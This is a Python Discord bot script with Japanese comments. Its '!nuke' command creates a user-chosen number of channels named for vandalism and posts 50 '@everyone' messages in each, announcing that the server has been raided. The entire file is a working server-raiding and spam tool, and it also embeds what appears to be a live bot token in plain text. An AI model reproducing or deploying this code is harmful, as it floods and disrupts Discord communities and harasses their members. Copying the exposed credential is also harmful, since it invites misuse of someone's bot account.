import discord
from discord.ext import commands

# Intentsの設定
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")

@bot.command(name="nuke")
async def nuke(ctx):
    # チャンネルを作成する数をユーザーに質問する
    await ctx.send("作成するチャンネルの数を入力してください（数字のみ）：")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.isdigit()

    try:
        msg = await bot.wait_for("message", check=check, timeout=30.0)
        channel_count = int(msg.content)
    except Exception:
        await ctx.send("タイムアウトまたは無効な入力です。")
        return

    await ctx.send(f"{channel_count}個のチャンネルを作成し、メッセージを送信します...")

    # 指定された数だけチャンネルを作成し、メッセージを連投する
    for i in range(channel_count):
        try:
            # チャンネルを作成
            channel = await ctx.guild.create_text_channel(f"荒らし-{i+1}")
            
            # 1チャンネルにつき50回メッセージを送信
            for _ in range(50):
                await channel.send("@everyone\n# このサーバーはとまっちによって荒らされましたwww")
        except Exception as e:
            print(f"エラーが発生しました: {e}")

# ボットのトークンを入れてください
bot.run("MTU1ODAxMDYwMjczNDIzMTU1Mw.GM-TqS.MwUPIEMOgyi6B4l37o1Jnt10j32VhFf-ofZ9P8")
